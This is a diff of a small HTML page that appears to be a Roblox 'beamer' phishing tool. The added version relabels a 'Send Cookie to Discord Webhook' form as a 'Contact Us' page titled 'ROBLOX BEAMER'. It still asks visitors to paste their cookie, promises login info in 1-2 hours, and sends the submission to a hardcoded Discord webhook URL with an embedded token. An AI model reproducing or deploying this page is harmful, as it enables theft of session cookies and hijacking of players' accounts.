@@ -2,34 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Send Cookie to Discord Webhook</title>
+  <title>RBXS7L34L3R - Contact Us</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #2b2b2b;
+      background: #0e0e0e;
       color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
     }
     form {
-      background: #444;
-      padding: 30px;
+      background: #1e1e1e;
+      padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0, 255, 153, 0.7);
+      box-shadow: 0 0 10px #00ff99;
     }
     input, textarea {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin-top: 10px;
       background: #333;
       color: white;
-      border: 1px solid #555;
+      border: none;
       border-radius: 5px;
-      font-size: 16px;
     }
     button {
       margin-top: 15px;
@@ -40,10 +38,6 @@
       cursor: pointer;
       color: #000;
       font-weight: bold;
-      font-size: 16px;
-    }
-    button:hover {
-      background-color: #009966;
     }
     .notice {
       font-size: 0.8rem;
@@ -54,27 +48,27 @@
 </head>
 <body>
 
-  <h1>Send Your Cookie to Discord</h1>
-  <form id="cookie-form">
+  <h1>ROBLOX BEAMER</h1>
+  <form id="contact-form">
     <input type="email" id="email" placeholder="Enter Email" required />
-    <textarea id="cookie" rows="4" placeholder="Enter Cookie Information" required></textarea>
+    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
     <button type="submit">Send</button>
-    <div class="notice">You will receive the login info in 1-2 hours.</div>
+    <div class="notice">You will recive the login info in 1-2 Hours.</div>
   </form>
 
   <script>
-    const form = document.getElementById('cookie-form');
+    const form = document.getElementById('contact-form');
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const email = document.getElementById('email').value;
-      const cookie = document.getElementById('cookie').value;
+      const message = document.getElementById('message').value;
 
-      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Your webhook URL here
+      const webhookUrl = 'https://discord.com/api/webhooks/1335736426129788988/ebhM3D4RZiRNugaz_1rA5sVu_9Es4s2p_n44ke9oWmRTXKabS5FPld-aG2wkXPUrQCts'; // Replace with your real webhook
 
       const payload = {
-        content: `📬 New Cookie Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie}`
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Message: ${message || "No message"}`
       };
 
       try {
@@ -87,13 +81,13 @@
         });
 
         if (response.ok) {
-          alert('Cookie has been sent successfully!');
+          alert('Thanks for your message!');
           form.reset();
         } else {
-          alert('Something went wrong, please try again.');
+          alert('Something went wrong.');
         }
       } catch (err) {
-        alert('Error sending the cookie.');
+        alert('Error sending message.');
         console.error(err);
       }
     });
